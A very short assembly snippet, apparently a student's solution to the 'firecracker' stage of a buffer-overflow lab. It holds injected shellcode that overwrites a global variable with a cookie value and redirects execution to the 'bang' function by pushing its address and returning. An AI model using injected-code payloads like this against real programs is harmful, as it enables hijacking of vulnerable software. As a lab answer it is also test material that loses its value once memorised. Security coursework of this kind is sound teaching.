#this is my exploit code for the firecracker stage

	movl   $0x35c5d934,0x804c1e4 #set global_value = cookie
	push $0x08048c52	#push address of bang onto stack
	ret